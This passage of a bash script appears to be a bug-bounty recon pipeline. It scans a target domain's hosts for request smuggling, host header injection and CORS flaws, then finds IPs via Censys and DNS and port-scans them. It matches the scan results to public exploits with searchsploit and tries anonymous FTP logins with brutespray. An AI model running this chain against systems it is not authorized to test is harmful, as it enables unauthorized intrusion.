        notify -silent -data $output/Recon/vulns/cors.json -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Host Header Injection${NC}"
    cat $output/Recon/httpx.txt | hinject | tee $output/Recon/vulns/host-header.txt

    if (( $(wc -l $output/Recon/vulns/host-header.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/host-header.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for HTTP Request Smuggling${NC}"
    python3 bb/smuggler.py -u $output/Recon/httpx.txt
    cat smuggler/output | grep "VULNERABLE" > $output/Recon/vulns/http-smuggling.txt
    rm -rf smuggler

    if (( $(wc -l $output/Recon/vulns/http-smuggling.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/http-smuggling.txt -bulk -silent > /dev/null 2> /dev/null
    fi
}


ips(){
    #Colletcing IP's based on CN
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Collecting IP's based on Certificates Common Name${NC}"
    censys search "services.tls.certificates.leaf_data.subject.common_name: \"$domain\"" --index-type hosts | jq -c '.[] | {ip: .ip}' | tr -d '{"ip":}' | anew $output/Recon/IPs/ips.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Converting subdomains to IP's from A records${NC}"
    cat $output/sources/all.txt | dnsx -r .tmp/resolvers-trusted.txt -resp-only -silent | anew $output/Recon/IPs/ips.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running Smap Scan${NC}"
    smap -iL $output/Recon/IPs/ips.txt -oA $output/Recon/IPs/smap

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Searching for exploits in IP's with searchsploit${NC}"
    searchsploit --nmap $output/Recon/IPs/smap.xml 2>/dev/null > $output/Recon/IPs/searchsploit.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Checking for Web services in IP's${NC}"
    ./bb/ultimate-nmap-parser.sh $output/Recon/IPs/smap.gnmap --web 2>/dev/null
    cat ~/web-urls.txt | httpx -silent -o $output/Recon/IPs/httpx-ips.txt
    rm -rf ~/web-urls.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Password Spraying on FTP Services for anonymous login from Smap output${NC}"
    brutespray -f $output/Recon/IPs/smap.gnmap -q -s ftp -u anonymous -p anonymous -t 7 -T 2 -o $output/Recon/IPs/brutespray
}


cloud_enum(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Searching for Cloud Assets${NC}"
    keyword=${domain%%.*}
    python3 ~/bb/cloud_enum/cloud_enum.py -k $keyword -l $output/Recon/cloud/cloud_assets.txt

    if (( $(wc -l $output/Recon/cloud/cloud_assets.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/cloud/cloud_assets.txt -bulk -silent > /dev/null 2> /dev/null
    fi
}


main(){
    domain_info
    dorking
    sub_passive
    sub_active
    sub_check
    http_probe
    flyover
    takeover
    waf_checks
    security_header_check
    exposures
    admin_login_finder
    nuclei_scan
    dir_fuzz
    find_urls
    gfp
    api
    find_params
    wordlist_gen
    js_recon
    vulns
    ips
    cloud_enum
}


end(){
DAY="$(date +%d/%m/%Y)"
TIME="$(date +%T)"
WEEKDAY="$(date +%A)"
end=$(date +%s)
seconds=$(echo "$end - $start" | bc)
echo -e "${CYAN}"
echo -e "Recon finished on $domain after $(awk -v t=$seconds 'BEGIN{t=int(t*1000); printf "%dh:%02dm:%02ds\n", t/3600000, t/60000%60, t/1000%60}') on ${WEEKDAY}, ${DAY} at ${TIME}"
echo -e "[BBA] - Recon finished on $domain in $(awk -v t=$seconds 'BEGIN{t=int(t*1000); printf "%dh:%02dm:%02ds\n", t/3600000, t/60000%60, t/1000%60}') on ${WEEKDAY}, ${DAY} at ${TIME}" | notify -silent > /dev/null 2> /dev/null
}

start
main
end

rm -rf .tmp
